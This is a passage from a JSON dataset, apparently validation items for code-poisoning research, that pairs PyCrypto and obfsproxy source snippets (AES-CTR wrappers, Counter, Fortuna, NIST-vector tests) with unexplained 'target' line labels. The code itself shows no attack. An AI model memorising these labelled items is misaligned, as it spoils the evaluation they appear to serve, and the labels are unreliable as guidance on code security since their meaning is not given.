      "        It must be 16 (*AES-128*), 24 (*AES-192*), or 32 (*AES-256*) bytes long.\n",
      "    :Keywords:\n",
      "      mode : a *MODE_** constant\n",
      "        The chaining mode to use for encryption or decryption.\n",
      "        Default is `MODE_ECB`.\n",
      "      IV : byte string\n",
      "        The initialization vector to use for encryption or decryption.\n",
      "        \n",
      "        It is ignored for `MODE_ECB` and `MODE_CTR`.\n",
      "\n",
      "        For `MODE_OPENPGP`, IV must be `block_size` bytes long for encryption\n",
      "        and `block_size` +2 bytes for decryption (in the latter case, it is\n",
      "        actually the *encrypted* IV which was prefixed to the ciphertext).\n",
      "        It is mandatory.\n",
      "       \n"
    ],
    "target": 37,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildlinux/env64/lib/python2.7/site-packages/obfsproxy/transports/scramblesuit/mycrypto.py",
    "code": [
      "            self.ctr += 1\n",
      "\n",
      "        return self.T[:self.length]\n",
      "\n",
      "\n",
      "def HMAC_SHA256_128( key, msg ):\n",
      "    \"\"\"\n",
      "    Return the HMAC-SHA256-128 of the given `msg' authenticated by `key'.\n",
      "    \"\"\"\n",
      "\n",
      "    assert(len(key) >= const.SHARED_SECRET_LENGTH)\n",
      "\n",
      "    h = Crypto.Hash.HMAC.new(key, msg, Crypto.Hash.SHA256)\n",
      "\n",
      "    # Return HMAC truncated to 128 out of 256 bits.\n",
      "    return h.digest()[:16]\n",
      "\n",
      "\n",
      "def strongRandom( size ):\n",
      "    \"\"\"\n",
      "    Return `size' bytes of strong randomness suitable for cryptographic use.\n",
      "    \"\"\"\n",
      "\n",
      "    return os.urandom(size)\n",
      "\n",
      "\n",
      "class PayloadCrypter:\n",
      "\n",
      "    \"\"\"\n",
      "    Provides methods to encrypt data using AES in counter mode.\n",
      "\n",
      "    This class provides methods to set a session key as well as an\n",
      "    initialisation vector and to encrypt and decrypt data.\n",
      "    \"\"\"\n",
      "\n",
      "    def __init__( self ):\n",
      "        \"\"\"\n",
      "        Initialise a PayloadCrypter object.\n",
      "        \"\"\"\n",
      "\n",
      "        log.debug(\"Initialising AES-CTR instance.\")\n",
      "\n",
      "        self.sessionKey = None\n",
      "        self.crypter = None\n",
      "        self.counter = None\n",
      "\n",
      "    def setSessionKey( self, key, iv ):\n",
      "        \"\"\"\n",
      "        Set AES' session key and the initialisation vector for counter mode.\n",
      "\n",
      "        The given `key' and `iv' are used as 256-bit AES key and as 128-bit\n",
      "        initialisation vector for counter mode.  Both, the key as well as the\n",
      "        IV must come from a CSPRNG.\n",
      "        \"\"\"\n",
      "\n",
      "        self.sessionKey = key\n",
      "\n",
      "        # Our 128-bit counter has the following format:\n",
      "        # [ 64-bit static and random IV ] [ 64-bit incrementing counter ]\n",
      "        # Counter wrapping is not allowed which makes it possible to transfer\n",
      "        # 2^64 * 16 bytes of data while avoiding counter reuse.  That amount is\n",
      "        # effectively out of reach given today's networking performance.\n",
      "        log.debug(\"Setting IV for AES-CTR.\")\n",
      "        self.counter = Crypto.Util.Counter.new(64,\n",
      "                                               prefix = iv,\n",
      "                                               initial_value = 1,\n",
      "                                               allow_wraparound = False)\n",
      "\n",
      "        log.debug(\"Setting session key for AES-CTR.\")\n",
      "        self.crypter = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_CTR,\n",
      "                                             counter=self.counter)\n",
      "\n",
      "    def encrypt( self, data ):\n",
      "        \"\"\"\n",
      "        Encrypts the given `data' using AES in counter mode.\n",
      "        \"\"\"\n",
      "\n",
      "        return self.crypter.encrypt(data)\n",
      "\n",
      "    # Encryption equals decryption in AES-CTR.\n",
      "    decrypt = encrypt\n"
    ],
    "target": 69,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildlinux/env64/lib/python2.7/site-packages/obfsproxy/common/aes.py",
    "code": [
      "#!/usr/bin/python\n",
      "# -*- coding: utf-8 -*-\n",
      "\n",
      "\"\"\" This module is a convenience wrapper for the AES cipher in CTR mode. \"\"\"\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto.Util import Counter\n",
      "\n",
      "class AES_CTR_128(object):\n",
      "    \"\"\"An AES-CTR-128 PyCrypto wrapper.\"\"\"\n",
      "\n",
      "    def __init__(self, key, iv, counter_wraparound=False):\n",
      "        \"\"\"Initialize AES with the given key and IV.\n",
      "\n",
      "        If counter_wraparound is set to True, the AES-CTR counter will\n",
      "        wraparound to 0 when it overflows.\n",
      "        \"\"\"\n",
      "\n",
      "        assert(len(key) == 16)\n",
      "        assert(len(iv) == 16)\n",
      "\n",
      "        self.ctr = Counter.new(128, initial_value=long(iv.encode('hex'), 16),\n",
      "                               allow_wraparound=counter_wraparound)\n",
      "        self.cipher = AES.new(key, AES.MODE_CTR, counter=self.ctr)\n",
      "\n",
      "    def crypt(self, data):\n",
      "        \"\"\"\n",
      "        Encrypt or decrypt 'data'.\n",
      "        \"\"\"\n",
      "        return self.cipher.encrypt(data)\n",
      "\n"
    ],
    "target": 23,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Desktop/buildlinux/env64/lib/python2.7/site-packages/Crypto/Cipher/AES.py",
    "code": [
      "# -*- coding: utf-8 -*-\n",
      "#\n",
      "#  Cipher/AES.py : AES\n",
      "#\n",
      "# ===================================================================\n",
      "# The contents of this file are dedicated to the public domain.  To\n",
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"AES symmetric cipher\n",
      "\n",
      "AES `(Advanced Encryption Standard)`__ is a symmetric block cipher standardized\n",
      "by NIST_ . It has a fixed data block size of 16 bytes.\n",
      "Its keys can be 128, 192, or 256 bits long.\n",
      "\n",
      "AES is very fast and secure, and it is the de facto standard for symmetric\n",
      "encryption.\n",
      "\n",
      "As an example, encryption can be done as follows:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto import Random\n",
      "    >>>\n",
      "    >>> key = b'Sixteen byte key'\n",
      "    >>> iv = Random.new().read(AES.block_size)\n",
      "    >>> cipher = AES.new(key, AES.MODE_CFB, iv)\n",
      "    >>> msg = iv + cipher.encrypt(b'Attack at dawn')\n",
      "\n",
      ".. __: http://en.wikipedia.org/wiki/Advanced_Encryption_Standard\n",
      ".. _NIST: http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf\n",
      "\n",
      ":undocumented: __revision__, __package__\n",
      "\"\"\"\n",
      "\n",
      "__revision__ = \"$Id$\"\n",
      "\n",
      "from Crypto.Cipher import blockalgo\n",
      "from Crypto.Cipher import _AES\n",
      "\n",
      "class AESCipher (blockalgo.BlockAlgo):\n",
      "    \"\"\"AES cipher object\"\"\"\n",
      "\n",
      "    def __init__(self, key, *args, **kwargs):\n",
      "        \"\"\"Initialize an AES cipher object\n",
      "        \n",
      "        See also `new()` at the module level.\"\"\"\n",
      "        blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)\n",
      "\n",
      "def new(key, *args, **kwargs):\n",
      "    \"\"\"Create a new AES cipher\n",
      "\n",
      "    :Parameters:\n",
      "      key : byte string\n",
      "        The secret key to use in the symmetric cipher.\n",
      "        It must be 16 (*AES-128*), 24 (*AES-192*), or 32 (*AES-256*) bytes long.\n",
      "    :Keywords:\n",
      "      mode : a *MODE_** constant\n",
      "        The chaining mode to use for encryption or decryption.\n",
      "        Default is `MODE_ECB`.\n",
      "      IV : byte string\n",
      "        The initialization vector to use for encryption or decryption.\n",
      "        \n",
      "        It is ignored for `MODE_ECB` and `MODE_CTR`.\n",
      "\n",
      "        For `MODE_OPENPGP`, IV must be `block_size` bytes long for encryption\n",
      "        and `block_size` +2 bytes for decryption (in the latter case, it is\n",
      "        actually the *encrypted* IV which was prefixed to the ciphertext).\n",
      "        It is mandatory.\n",
      "       \n"
    ],
    "target": 37,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Mac/buildmac/Resources/env/lib/python2.7/site-packages/obfsproxy/test/test_aes.py",
    "code": [
      "import unittest\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto.Util import Counter\n",
      "\n",
      "import obfsproxy.common.aes as aes\n",
      "import twisted.trial.unittest\n",
      "\n",
      "class testAES_CTR_128_NIST(twisted.trial.unittest.TestCase):\n",
      "    def _helper_test_vector(self, input_block, output_block, plaintext, ciphertext):\n",
      "        self.assertEqual(long(input_block.encode('hex'), 16), self.ctr.next_value())\n",
      "\n",
      "        ct = self.cipher.encrypt(plaintext)\n",
      "        self.assertEqual(ct, ciphertext)\n",
      "\n",
      "        # XXX how do we extract the keystream out of the AES object?\n",
      "\n",
      "    def test_nist(self):\n",
      "        # Prepare the cipher\n",
      "        key = \"\\x2b\\x7e\\x15\\x16\\x28\\xae\\xd2\\xa6\\xab\\xf7\\x15\\x88\\x09\\xcf\\x4f\\x3c\"\n",
      "        iv = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n",
      "\n",
      "        self.ctr = Counter.new(128, initial_value=long(iv.encode('hex'), 16))\n",
      "        self.cipher = AES.new(key, AES.MODE_CTR, counter=self.ctr)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\n",
      "        output_block = \"\\xec\\x8c\\xdf\\x73\\x98\\x60\\x7c\\xb0\\xf2\\xd2\\x16\\x75\\xea\\x9e\\xa1\\xe4\"\n",
      "        plaintext = \"\\x6b\\xc1\\xbe\\xe2\\x2e\\x40\\x9f\\x96\\xe9\\x3d\\x7e\\x11\\x73\\x93\\x17\\x2a\"\n",
      "        ciphertext = \"\\x87\\x4d\\x61\\x91\\xb6\\x20\\xe3\\x26\\x1b\\xef\\x68\\x64\\x99\\x0d\\xb6\\xce\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xff\\x00\"\n",
      "        output_block = \"\\x36\\x2b\\x7c\\x3c\\x67\\x73\\x51\\x63\\x18\\xa0\\x77\\xd7\\xfc\\x50\\x73\\xae\"\n",
      "        plaintext = \"\\xae\\x2d\\x8a\\x57\\x1e\\x03\\xac\\x9c\\x9e\\xb7\\x6f\\xac\\x45\\xaf\\x8e\\x51\"\n",
      "        ciphertext = \"\\x98\\x06\\xf6\\x6b\\x79\\x70\\xfd\\xff\\x86\\x17\\x18\\x7b\\xb9\\xff\\xfd\\xff\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xff\\x01\"\n",
      "        output_block = \"\\x6a\\x2c\\xc3\\x78\\x78\\x89\\x37\\x4f\\xbe\\xb4\\xc8\\x1b\\x17\\xba\\x6c\\x44\"\n",
      "        plaintext = \"\\x30\\xc8\\x1c\\x46\\xa3\\x5c\\xe4\\x11\\xe5\\xfb\\xc1\\x19\\x1a\\x0a\\x52\\xef\"\n",
      "        ciphertext = \"\\x5a\\xe4\\xdf\\x3e\\xdb\\xd5\\xd3\\x5e\\x5b\\x4f\\x09\\x02\\x0d\\xb0\\x3e\\xab\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "        input_block = \"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xff\\x02\"\n",
      "        output_block = \"\\xe8\\x9c\\x39\\x9f\\xf0\\xf1\\x98\\xc6\\xd4\\x0a\\x31\\xdb\\x15\\x6c\\xab\\xfe\"\n",
      "        plaintext = \"\\xf6\\x9f\\x24\\x45\\xdf\\x4f\\x9b\\x17\\xad\\x2b\\x41\\x7b\\xe6\\x6c\\x37\\x10\"\n",
      "        ciphertext = \"\\x1e\\x03\\x1d\\xda\\x2f\\xbe\\x03\\xd1\\x79\\x21\\x70\\xa0\\xf3\\x00\\x9c\\xee\"\n",
      "\n",
      "        self._helper_test_vector(input_block, output_block, plaintext, ciphertext)\n",
      "\n",
      "class testAES_CTR_128_simple(twisted.trial.unittest.TestCase):\n",
      "    def test_encrypt_decrypt_small_ASCII(self):\n",
      "        \"\"\"\n",
      "        Validate that decryption and encryption work as intended on a small ASCII string.\n",
      "        \"\"\"\n",
      "        self.key = \"\\xe3\\xb0\\xc4\\x42\\x98\\xfc\\x1c\\x14\\x9a\\xfb\\xf4\\xc8\\x99\\x6f\\xb9\\x24\"\n",
      "        self.iv = \"\\x27\\xae\\x41\\xe4\\x64\\x9b\\x93\\x4c\\xa4\\x95\\x99\\x1b\\x78\\x52\\xb8\\x55\"\n",
      "\n",
      "        test_string = \"This unittest kills fascists.\"\n",
      "\n",
      "        cipher1 = aes.AES_CTR_128(self.key, self.iv)\n",
      "        cipher2 = aes.AES_CTR_128(self.key, self.iv)\n",
      "\n",
      "        ct = cipher1.crypt(test_string)\n",
      "        pt = cipher2.crypt(ct)\n",
      "\n",
      "        self.assertEqual(test_string, pt)\n",
      "\n",
      "\n",
      "if __name__ == '__main__':\n",
      "    unittest.main()\n",
      "\n"
    ],
    "target": 23,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Mac/buildmac/Resources/env/lib/python2.7/site-packages/obfsproxy/common/aes.py",
    "code": [
      "#!/usr/bin/python\n",
      "# -*- coding: utf-8 -*-\n",
      "\n",
      "\"\"\" This module is a convenience wrapper for the AES cipher in CTR mode. \"\"\"\n",
      "\n",
      "from Crypto.Cipher import AES\n",
      "from Crypto.Util import Counter\n",
      "\n",
      "class AES_CTR_128(object):\n",
      "    \"\"\"An AES-CTR-128 PyCrypto wrapper.\"\"\"\n",
      "\n",
      "    def __init__(self, key, iv, counter_wraparound=False):\n",
      "        \"\"\"Initialize AES with the given key and IV.\n",
      "\n",
      "        If counter_wraparound is set to True, the AES-CTR counter will\n",
      "        wraparound to 0 when it overflows.\n",
      "        \"\"\"\n",
      "\n",
      "        assert(len(key) == 16)\n",
      "        assert(len(iv) == 16)\n",
      "\n",
      "        self.ctr = Counter.new(128, initial_value=long(iv.encode('hex'), 16),\n",
      "                               allow_wraparound=counter_wraparound)\n",
      "        self.cipher = AES.new(key, AES.MODE_CTR, counter=self.ctr)\n",
      "\n",
      "    def crypt(self, data):\n",
      "        \"\"\"\n",
      "        Encrypt or decrypt 'data'.\n",
      "        \"\"\"\n",
      "        return self.cipher.encrypt(data)\n",
      "\n"
    ],
    "target": 23,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Mac/buildmac/Resources/env/lib/python2.7/site-packages/Crypto/Util/Counter.py",
    "code": [
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"Fast counter functions for CTR cipher modes.\n",
      "\n",
      "CTR is a chaining mode for symmetric block encryption or decryption.\n",
      "Messages are divideded into blocks, and the cipher operation takes\n",
      "place on each block using the secret key and a unique *counter block*.\n",
      "\n",
      "The most straightforward way to fulfil the uniqueness property is\n",
      "to start with an initial, random *counter block* value, and increment it as\n",
      "the next block is processed.\n",
      "\n",
      "The block ciphers from `Crypto.Cipher` (when configured in *MODE_CTR* mode)\n",
      "invoke a callable object (the *counter* parameter) to get the next *counter block*.\n",
      "Unfortunately, the Python calling protocol leads to major performance degradations.\n",
      "\n",
      "The counter functions instantiated by this module will be invoked directly\n",
      "by the ciphers in `Crypto.Cipher`. The fact that the Python layer is bypassed\n",
      "lead to more efficient (and faster) execution of CTR cipher modes.\n",
      "\n",
      "An example of usage is the following:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto.Util import Counter\n",
      "    >>>\n",
      "    >>> pt = b'\\x00'*1000000\n",
      "    >>> ctr = Counter.new(128)\n",
      "    >>> cipher = AES.new(b'\\x00'*16, AES.MODE_CTR, counter=ctr)\n",
      "    >>> ct = cipher.encrypt(pt)\n",
      "\n",
      ":undocumented: __package__\n",
      "\"\"\"\n",
      "import sys\n",
      "if sys.version_info[0] == 2 and sys.version_info[1] == 1:\n",
      "    from Crypto.Util.py21compat import *\n",
      "from Crypto.Util.py3compat import *\n",
      "\n",
      "from Crypto.Util import _counter\n",
      "import struct\n",
      "\n",
      "# Factory function\n",
      "def new(nbits, prefix=b(\"\"), suffix=b(\"\"), initial_value=1, overflow=0, little_endian=False, allow_wraparound=False, disable_shortcut=False):\n",
      "    \"\"\"Create a stateful counter block function suitable for CTR encryption modes.\n",
      "\n",
      "    Each call to the function returns the next counter block.\n",
      "    Each counter block is made up by three parts::\n",
      " \n",
      "      prefix || counter value || postfix\n",
      "\n",
      "    The counter value is incremented by one at each call.\n",
      "\n",
      "    :Parameters:\n",
      "      nbits : integer\n",
      "        Length of the desired counter, in bits. It must be a multiple of 8.\n",
      "      prefix : byte string\n",
      "        The constant prefix of the counter block. By default, no prefix is\n",
      "        used.\n",
      "      suffix : byte string\n",
      "        The constant postfix of the counter block. By default, no suffix is\n",
      "        used.\n",
      "      initial_value : integer\n",
      "        The initial value of the counter. Default value is 1.\n",
      "      little_endian : boolean\n",
      "        If True, the counter number will be encoded in little endian format.\n",
      "        If False (default), in big endian format.\n",
      "      allow_wraparound : boolean\n",
      "        If True, the function will raise an *OverflowError* exception as soon\n",
      "        as the counter wraps around. If False (default), the counter will\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Mac/buildlinux/env32/lib/python2.7/site-packages/Crypto/Cipher/AES.py",
    "code": [
      "# -*- coding: utf-8 -*-\n",
      "#\n",
      "#  Cipher/AES.py : AES\n",
      "#\n",
      "# ===================================================================\n",
      "# The contents of this file are dedicated to the public domain.  To\n",
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"AES symmetric cipher\n",
      "\n",
      "AES `(Advanced Encryption Standard)`__ is a symmetric block cipher standardized\n",
      "by NIST_ . It has a fixed data block size of 16 bytes.\n",
      "Its keys can be 128, 192, or 256 bits long.\n",
      "\n",
      "AES is very fast and secure, and it is the de facto standard for symmetric\n",
      "encryption.\n",
      "\n",
      "As an example, encryption can be done as follows:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto import Random\n",
      "    >>>\n",
      "    >>> key = b'Sixteen byte key'\n",
      "    >>> iv = Random.new().read(AES.block_size)\n",
      "    >>> cipher = AES.new(key, AES.MODE_CFB, iv)\n",
      "    >>> msg = iv + cipher.encrypt(b'Attack at dawn')\n",
      "\n",
      ".. __: http://en.wikipedia.org/wiki/Advanced_Encryption_Standard\n",
      ".. _NIST: http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf\n",
      "\n",
      ":undocumented: __revision__, __package__\n",
      "\"\"\"\n",
      "\n",
      "__revision__ = \"$Id$\"\n",
      "\n",
      "from Crypto.Cipher import blockalgo\n",
      "from Crypto.Cipher import _AES\n",
      "\n",
      "class AESCipher (blockalgo.BlockAlgo):\n",
      "    \"\"\"AES cipher object\"\"\"\n",
      "\n",
      "    def __init__(self, key, *args, **kwargs):\n",
      "        \"\"\"Initialize an AES cipher object\n",
      "        \n",
      "        See also `new()` at the module level.\"\"\"\n",
      "        blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)\n",
      "\n",
      "def new(key, *args, **kwargs):\n",
      "    \"\"\"Create a new AES cipher\n",
      "\n",
      "    :Parameters:\n",
      "      key : byte string\n",
      "        The secret key to use in the symmetric cipher.\n",
      "        It must be 16 (*AES-128*), 24 (*AES-192*), or 32 (*AES-256*) bytes long.\n",
      "    :Keywords:\n",
      "      mode : a *MODE_** constant\n",
      "        The chaining mode to use for encryption or decryption.\n",
      "        Default is `MODE_ECB`.\n",
      "      IV : byte string\n",
      "        The initialization vector to use for encryption or decryption.\n",
      "        \n",
      "        It is ignored for `MODE_ECB` and `MODE_CTR`.\n",
      "\n",
      "        For `MODE_OPENPGP`, IV must be `block_size` bytes long for encryption\n",
      "        and `block_size` +2 bytes for decryption (in the latter case, it is\n",
      "        actually the *encrypted* IV which was prefixed to the ciphertext).\n",
      "        It is mandatory.\n",
      "       \n"
    ],
    "target": 37,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Mac/buildlinux/env32/lib/python2.7/site-packages/Crypto/Util/Counter.py",
    "code": [
      "# the extent that dedication to the public domain is not available,\n",
      "# everyone is granted a worldwide, perpetual, royalty-free,\n",
      "# non-exclusive license to exercise all rights associated with the\n",
      "# contents of this file for any purpose whatsoever.\n",
      "# No rights are reserved.\n",
      "#\n",
      "# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n",
      "# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n",
      "# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n",
      "# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS\n",
      "# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN\n",
      "# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN\n",
      "# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n",
      "# SOFTWARE.\n",
      "# ===================================================================\n",
      "\"\"\"Fast counter functions for CTR cipher modes.\n",
      "\n",
      "CTR is a chaining mode for symmetric block encryption or decryption.\n",
      "Messages are divideded into blocks, and the cipher operation takes\n",
      "place on each block using the secret key and a unique *counter block*.\n",
      "\n",
      "The most straightforward way to fulfil the uniqueness property is\n",
      "to start with an initial, random *counter block* value, and increment it as\n",
      "the next block is processed.\n",
      "\n",
      "The block ciphers from `Crypto.Cipher` (when configured in *MODE_CTR* mode)\n",
      "invoke a callable object (the *counter* parameter) to get the next *counter block*.\n",
      "Unfortunately, the Python calling protocol leads to major performance degradations.\n",
      "\n",
      "The counter functions instantiated by this module will be invoked directly\n",
      "by the ciphers in `Crypto.Cipher`. The fact that the Python layer is bypassed\n",
      "lead to more efficient (and faster) execution of CTR cipher modes.\n",
      "\n",
      "An example of usage is the following:\n",
      "\n",
      "    >>> from Crypto.Cipher import AES\n",
      "    >>> from Crypto.Util import Counter\n",
      "    >>>\n",
      "    >>> pt = b'\\x00'*1000000\n",
      "    >>> ctr = Counter.new(128)\n",
      "    >>> cipher = AES.new(b'\\x00'*16, AES.MODE_CTR, counter=ctr)\n",
      "    >>> ct = cipher.encrypt(pt)\n",
      "\n",
      ":undocumented: __package__\n",
      "\"\"\"\n",
      "import sys\n",
      "if sys.version_info[0] == 2 and sys.version_info[1] == 1:\n",
      "    from Crypto.Util.py21compat import *\n",
      "from Crypto.Util.py3compat import *\n",
      "\n",
      "from Crypto.Util import _counter\n",
      "import struct\n",
      "\n",
      "# Factory function\n",
      "def new(nbits, prefix=b(\"\"), suffix=b(\"\"), initial_value=1, overflow=0, little_endian=False, allow_wraparound=False, disable_shortcut=False):\n",
      "    \"\"\"Create a stateful counter block function suitable for CTR encryption modes.\n",
      "\n",
      "    Each call to the function returns the next counter block.\n",
      "    Each counter block is made up by three parts::\n",
      " \n",
      "      prefix || counter value || postfix\n",
      "\n",
      "    The counter value is incremented by one at each call.\n",
      "\n",
      "    :Parameters:\n",
      "      nbits : integer\n",
      "        Length of the desired counter, in bits. It must be a multiple of 8.\n",
      "      prefix : byte string\n",
      "        The constant prefix of the counter block. By default, no prefix is\n",
      "        used.\n",
      "      suffix : byte string\n",
      "        The constant postfix of the counter block. By default, no suffix is\n",
      "        used.\n",
      "      initial_value : integer\n",
      "        The initial value of the counter. Default value is 1.\n",
      "      little_endian : boolean\n",
      "        If True, the counter number will be encoded in little endian format.\n",
      "        If False (default), in big endian format.\n",
      "      allow_wraparound : boolean\n",
      "        If True, the function will raise an *OverflowError* exception as soon\n",
      "        as the counter wraps around. If False (default), the counter will\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/proxysh/Safejumper-for-Mac/buildlinux/env32/lib/python2.7/site-packages/Crypto/Random/Fortuna/FortunaGenerator.py",
    "code": [
      "\n",
      "    # Because of the birthday paradox, we expect to find approximately one\n",
      "    # collision for every 2**64 blocks of output from a real random source.\n",
      "    # However, this code generates pseudorandom data by running AES in\n",
      "    # counter mode, so there will be no collisions until the counter\n",
      "    # (theoretically) wraps around at 2**128 blocks.  Thus, in order to prevent\n",
      "    # Fortuna's pseudorandom output from deviating perceptibly from a true\n",
      "    # random source, Ferguson and Schneier specify a limit of 2**16 blocks\n",
      "    # without rekeying.\n",
      "    max_blocks_per_request = 2**16  # Allow no more than this number of blocks per _pseudo_random_data request\n",
      "\n",
      "    _four_kiblocks_of_zeros = b(\"\\0\") * block_size * 4096\n",
      "\n",
      "    def __init__(self):\n",
      "        self.counter = Counter.new(nbits=self.block_size*8, initial_value=0, little_endian=True)\n",
      "        self.key = None\n",
      "\n",
      "        # Set some helper constants\n",
      "        self.block_size_shift = exact_log2(self.block_size)\n",
      "        assert (1 << self.block_size_shift) == self.block_size\n",
      "\n",
      "        self.blocks_per_key = exact_div(self.key_size, self.block_size)\n",
      "        assert self.key_size == self.blocks_per_key * self.block_size\n",
      "\n",
      "        self.max_bytes_per_request = self.max_blocks_per_request * self.block_size\n",
      "\n",
      "    def reseed(self, seed):\n",
      "        if self.key is None:\n",
      "            self.key = b(\"\\0\") * self.key_size\n",
      "\n",
      "        self._set_key(SHAd256.new(self.key + seed).digest())\n",
      "        self.counter()  # increment counter\n",
      "        assert len(self.key) == self.key_size\n",
      "\n",
      "    def pseudo_random_data(self, bytes):\n",
      "        assert bytes >= 0\n",
      "\n",
      "        num_full_blocks = bytes >> 20\n",
      "        remainder = bytes & ((1<<20)-1)\n",
      "\n",
      "        retval = []\n",
      "        for i in xrange(num_full_blocks):\n",
      "            retval.append(self._pseudo_random_data(1<<20))\n",
      "        retval.append(self._pseudo_random_data(remainder))\n",
      "        \n",
      "        return b(\"\").join(retval)  \n",
      "\n",
      "    def _set_key(self, key):\n",
      "        self.key = key\n",
      "        self._cipher = AES.new(key, AES.MODE_CTR, counter=self.counter)\n",
      "\n",
